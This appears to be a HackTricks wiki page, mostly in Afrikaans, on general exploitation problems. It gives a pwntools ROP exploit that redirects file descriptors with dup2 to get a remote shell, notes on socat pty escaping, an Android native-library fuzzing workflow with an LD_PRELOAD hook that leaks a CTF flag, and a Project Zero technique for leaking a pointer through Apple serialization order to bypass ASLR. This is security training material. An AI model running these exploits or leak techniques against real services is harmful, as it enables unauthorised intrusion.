# Algemene Uitbuitingprobleme

{{#include ../banners/hacktricks-training.md}}

## FDs in Afstandsuitbuiting

Wanneer jy 'n exploit na 'n remote server stuur wat byvoorbeeld **`system('/bin/sh')`** aanroep, sal dit natuurlik in die serverproses uitgevoer word, en `/bin/sh` sal insette vanaf stdin (FD: `0`) verwag en die uitsette na stdout en stderr (FDs `1` en `2`) druk. Dus sal die aanvaller nie met die shell kan interaksie hê nie.

Een manier om dit reg te stel is om aan te neem dat toe die server begin het dit die **FD nommer `3`** geskep het (vir luister) en dat jou verbinding daarna in die **FD nommer `4`** gaan wees. Daarom is dit moontlik om die syscall **`dup2`** te gebruik om die stdin (FD 0) en die stdout (FD 1) na FD 4 (die een van die aanvaller se verbinding) te dupliseer, sodat dit moontlik sal wees om kontak met die shell te maak sodra dit uitgevoer is.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Let wel dat socat reeds **`stdin`** en **`stdout`** na die socket oordra. Die `pty`-modus sluit egter **DELETE-tekens in**. Dus, as jy `\x7f` (`DELETE`) stuur, sal dit die **vorige karakter van jou exploit uitvee**.

Om dit te omseil moet die **escape character `\x16` voor enige `\x7f` gestuur word.**

**Hier kan jy** [**'n voorbeeld van hierdie gedrag vind**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 shared-library fuzzing & LD_PRELOAD hooking

Wanneer 'n Android-app slegs 'n gestripe AArch64 `.so` lewer, kan jy steeds die geëksporteerde logika direk op die toestel fuzz sonder om die APK te herbou. 'n Praktiese werkvloei:

1. **Lokaliseer oproepbare toegangspunte.** `objdump -T libvalidate.so | grep -E "validate"` lys vinnig die geëksporteerde funksies. Decompilers (Ghidra, IDA, BN) openbaar die werklike handtekening, bv. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Skryf 'n standalone harness.** Laai 'n lêer, hou die buffer lewendig, en roep die geëksporteerde simbool presies soos die app sou doen. Kruis-kompileer met die NDK (bv. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Minimale lêer-gedrewe harness</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Herbou die verwagte struktuur.** Foutstringe en vergelykings in Ghidra het getoon dat die funksie streng JSON met konstante sleutels (`magic`, `version`, nested `root.children.*`) ontleed, en rekenkundige kontroles (bv., `value * 2 == 84` ⇒ `value` moet `42` wees). Deur sintakties geldige JSON te voorsien wat geleidelik elke tak bevredig, kan jy die skema in kaart bring sonder instrumentering.
4. **Om anti-debug te omseil om geheime te leak.** Omdat die `.so` `snprintf` invoer, oorboor dit met `LD_PRELOAD` om sensitiewe format strings te dump selfs wanneer breakpoints geblokkeer is:

<details>
<summary>Minimale snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltrates the internal flag en bevestig die crash oracle sonder om die binary te patch.
5. **Krimp die fuzz-ruimte.** Disassembly het 'n XOR-sleutel blootgestel wat hergebruik is in die flag-vergelyking, wat beteken dat die eerste sewe bytes van `flag` bekend was. Fuzz slegs die nege onbekende bytes.
6. **Insluit fuzz-bytes in 'n geldige JSON-omhulsel.** Die AFL harness lees presies nege bytes van `stdin`, kopieer dit na die flag-suffix, en hard-codeer elke ander veld (constants, tree depths, arithmetic preimage). Enige foutiewe lees beëindig eenvoudig die program, sodat AFL sy siklusse aan betekenisvolle testcases bestee:

<details>
<summary>Minimal AFL harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** Enige inset wat elke semantiese kontrole deurstaan en die korrekte nege-byte suffix raai, veroorsaak die doelbewuste crash; daardie lêers beland in `output/crashes` en kan deur die eenvoudige harness opnieuw afgespeel word om die geheim te herstel.

Hierdie workflow laat jou toe om anti-debug-beskermde JNI-validators vinnig te triage, secrets te leak wanneer nodig, en dan slegs die betekenisvolle bytes te fuzz, alles sonder om die oorspronklike APK aan te raak.

## Pointer-Keyed Hash Table Pointer Leaks on Apple Serialization

### Requirements & attack surface

- A service accepts attacker-controlled property lists (XML or binary) and calls `NSKeyedUnarchiver.unarchivedObjectOfClasses` with a permissive allowlist (e.g., `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`).
- The resulting objects are reused and later serialized again with `NSKeyedArchiver` (or iterated in deterministic bucket order) and sent back to the attacker.
- Some key type in the containers uses pointer values as its hash code. Before March 2025, `CFNull`/`NSNull` fell back to `CFHash(object) == (uintptr_t)object`, and deserialization always returned the shared-cache singleton `kCFNull`, giving a stable kernel-shared pointer without memory corruption or timing.

### Controllable hashing primitives

- **Pointer-based hashing:** `CFNull`’s `CFRuntimeClass` lacks a hash callback, so `CFBasicHash` uses the object address as the hash. Because the singleton lives at a fixed shared-cache address until reboot, its hash is stable across processes.
- **Attacker-controlled hashes:** 32-bit `NSNumber` keys are hashed through `_CFHashInt`, which is deterministic and attacker-controllable. Picking specific integers lets the attacker choose `hash(number) % num_buckets` for any table size.
- **`NSDictionary` implementation:** Immutable dictionaries embed a `CFBasicHash` with a prime bucket count chosen from `__CFBasicHashTableSizes` (e.g., 23, 41, 71, 127, 191, 251, 383, 631, 1087). Collisions are handled with linear probing (`__kCFBasicHashLinearHashingValue`), and serialization walks buckets in numeric order; therefore, the order of serialized keys encodes the bucket index that each key finally occupied.

### Encoding bucket indices into serialization order

By crafting a plist that materializes a dictionary whose buckets alternate between occupied and empty slots, the attacker constrains where linear probing can place `NSNull`. For a 7-bucket example, filling even buckets with `NSNumber` keys produces:
```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```
Tydens deserialization plaas die slagoffer die enkele `NSNull` sleutel. Sy aanvanklike bucket is `hash(NSNull) % 7`, maar probing vorder totdat een van die oop indekse {1,3,5} bereik word. Die serialized sleutelvolgorde openbaar watter slot gebruik is, en dui aan of die pointer.hash modulo 7 in {6,0,1}, {2,3}, of {4,5} val. Omdat die aanvaller die oorspronklike serialized volgorde beheer, word die `NSNull` sleutel laaste in die invoer plist uitgegee, sodat die post-reserialization ordering uitsluitlik 'n funksie van bucket-plaatsing is.

### Resolving exact residues with complementary tables

'n Enkel dictionary only leaks 'n reeks residues. Om die presiese waarde van `hash(NSNull) % p` te bepaal, bou **twee** dictionaries per priem bucket-grootte `p`: een met ewe buckets vooraf gevul en een met onewe buckets vooraf gevul. Vir die komplementère patroon (`_ # _ # _ # _`), kaart die leë slots (0,2,4,6) na residue stelle {0}, {1,2}, {3,4}, {5,6}. Deur die serialized posisie van `NSNull` in beide dictionaries waar te neem, word die residue beperk tot 'n enkele waarde omdat die snit van die twee kandidaatstelle 'n unieke `r_i` vir daardie `p` oplewer.

Die aanvaller bundel alle dictionaries binne 'n `NSArray`, sodat 'n enkele deserialize → serialize round trip die residues vir elke gekose tabelgrootte leaks.

### Reconstructing the 64-bit shared-cache pointer

Vir elke priem `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}`, herstel die aanvaller `hash(NSNull) ≡ r_i (mod p_i)` uit die serialized volgorde. Die toepassing van die Chinese Reststelling (CRT) met die uitgebreide Euclidiese algoritme lewer:
```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```
dus is die gekombineerde residu uniek gelyk aan die 64-bit pointer to `kCFNull`. Die Project Zero PoC kombineer iteratief kongruensies terwyl dit tussentydse moduli uitdruk om konvergensie na die werklike adres (`0x00000001eb91ab60` on the vulnerable build) te toon.

### Praktiese werkvloe

1. **Generate crafted input:** Bou die aanvallerskant XML plist (two dictionaries per prime, `NSNull` serialized last) en skakel dit na binêre formaat.
```bash
clang -o attacker-input-generator attacker-input-generator.c
./attacker-input-generator > attacker-input.plist
plutil -convert binary1 attacker-input.plist
```
2. **Victim round trip:** Die slagoffer-diens deserialiseer met `NSKeyedUnarchiver.unarchivedObjectOfClasses` using the allowed classes set `{NSDictionary, NSArray, NSNumber, NSString, NSNull}` en her-serialiseer onmiddellik met `NSKeyedArchiver`.
3. **Residue extraction:** Deur die teruggegewe plist weer na XML te skakel, openbaar dit die dictionary key ordering. 'n Helper soos `extract-pointer.c` lees die object table, bepaal die indeks van die singleton `NSNull`, map elke dictionary-paar terug na sy bucket residue, en los die CRT-stelsel op om die shared-cache pointer te herstel.
4. **Verification (optional):** Deur 'n klein Objective-C helper te compileer wat `CFHash(kCFNull)` druk, word bevestig dat die leaked waarde ooreenstem met die werklike adres.

Geen memory safety bug is nodig nie — eenvoudig deur die serialization order van pointer-keyed structures waar te neem, verkry jy 'n remote ASLR bypass primitive.

## Verwante bladsye

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## Verwysings

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)
- [Pointer leaks through pointer-keyed data structures (Project Zero)](https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html)

{{#include ../banners/hacktricks-training.md}}
